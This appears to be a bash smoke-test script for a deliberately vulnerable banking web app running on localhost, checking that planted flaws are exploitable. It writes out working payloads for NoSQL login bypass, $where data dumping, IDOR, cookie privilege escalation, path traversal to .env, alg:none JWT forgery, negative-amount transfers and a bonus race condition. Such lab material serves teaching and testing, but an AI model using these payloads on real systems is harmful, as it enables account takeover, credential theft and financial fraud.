#!/usr/bin/env bash
# smoke-test.sh — proves the main vulnerabilities fire end-to-end.
# Prereq: the server is running (npm start) on $BASE.
set -u
BASE="${BASE:-http://localhost:3000}"
J="$(mktemp)"; pass=0; fail=0
ok(){ echo "  ✅ $1"; pass=$((pass+1)); }
no(){ echo "  ❌ $1"; fail=$((fail+1)); }

echo "== §1 NoSQL auth bypass (JSON \$ne), log in as admin without the password =="
loc=$(curl -s -o /dev/null -w '%{redirect_url}' -c "$J" -H 'Content-Type: application/json' \
  -d '{"email":"admin@bank.local","password":{"$ne":"x"}}' "$BASE/login" -i 2>/dev/null)
code=$(curl -s -o /dev/null -w '%{http_code}' -c "$J" -H 'Content-Type: application/json' \
  -d '{"email":"admin@bank.local","password":{"$ne":"x"}}' "$BASE/login")
[ "$code" = "302" ] && ok "login returned 302 redirect (bypassed)" || no "expected 302, got $code"

echo "== §1b form-field operator injection (password[\$ne]=x) =="
code=$(curl -s -o /dev/null -w '%{http_code}' -c "$J" -d 'email=admin@bank.local&password[$ne]=x' "$BASE/login")
[ "$code" = "302" ] && ok "form bracket operator bypassed login" || no "expected 302, got $code"

echo "== §2 \$where injection dumps every account + plaintext password =="
dump=$(curl -s -b "$J" --get --data-urlencode 'filter={"$where":"return true"}' "$BASE/search")
echo "$dump" | grep -q 'Admin@123' && ok "admin plaintext password leaked via \$where" || no "no password in dump"

echo "== §3 IDOR: read admin's row via view-account?id=1 =="
curl -s -b "$J" "$BASE/view-account?id=1" | grep -q 'Admin@123' && ok "read admin password by walking id" || no "IDOR failed"

echo "== §9 privilege escalation via role cookie =="
n=$(curl -s -b 'role=admin' "$BASE/admin?admin=1" | grep -c 'bank.local')
[ "$n" -ge 3 ] && ok "role=admin cookie exposed full customer table ($n rows)" || no "cookie escalation failed ($n)"

echo "== §11 path traversal reads .env =="
curl -s "$BASE/file?file=.env" | grep -q 'JWT_SECRET' && ok "leaked JWT_SECRET via ?file=.env" || no "traversal failed"

echo "== §13 dev-file leak: GET /.env served from web root =="
curl -s "$BASE/.env" | grep -q 'JWT_SECRET' && ok "/.env downloadable" || no "/.env not served"

echo "== §14 JWT alg:none forgery -> role:admin =="
tok=$(node -e 'const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");process.stdout.write(b({alg:"none",typ:"JWT"})+"."+b({sub:"admin",role:"admin"})+".")')
curl -s -H "Authorization: Bearer $tok" "$BASE/api" | grep -q '"role":"admin"' && ok "alg:none forged admin token accepted" || no "JWT forgery failed"

echo "== §5 negative-amount transfer MINTS money =="
# log in as bob, read balance, send a negative transfer, read balance again
curl -s -c "$J" -H 'Content-Type: application/json' -d '{"email":"bob@bank.local","password":{"$ne":"x"}}' "$BASE/login" -o /dev/null
before=$(curl -s -b "$J" "$BASE/" | grep -o '\$[0-9,]*\.[0-9][0-9]' | head -1)
curl -s -b "$J" -d 'from_account=1000000003&to_account=1000000002&amount=-1000&transfer=1' "$BASE/transfer" -o /dev/null
after=$(curl -s -b "$J" "$BASE/" | grep -o '\$[0-9,]*\.[0-9][0-9]' | head -1)
echo "    balance $before -> $after"
[ "$before" != "$after" ] && ok "negative transfer changed balance upward" || no "balance unchanged"

echo "== §6 race condition: 10 concurrent \$10 bonus claims < +\$100 =="
curl -s -c "$J" -H 'Content-Type: application/json' -d '{"email":"alice@bank.local","password":{"$ne":"x"}}' "$BASE/login" -o /dev/null
b0=$(curl -s -b "$J" "$BASE/" | grep -o '[0-9][0-9,]*\.[0-9][0-9]' | head -1 | tr -d ',')
for i in $(seq 1 10); do curl -s -b "$J" -X POST "$BASE/bonus" -o /dev/null & done; wait
b1=$(curl -s -b "$J" "$BASE/" | grep -o '[0-9][0-9,]*\.[0-9][0-9]' | head -1 | tr -d ',')
gain=$(node -e "console.log((($b1)-($b0)).toFixed(2))" 2>/dev/null)
echo "    gained \$$gain from 10 claims (honest = \$100.00)"
awk "BEGIN{exit !($gain < 100)}" && ok "lost updates: gained < \$100" || no "no race observed (gain=$gain)"

echo; echo "RESULT: $pass passed, $fail failed"; rm -f "$J"
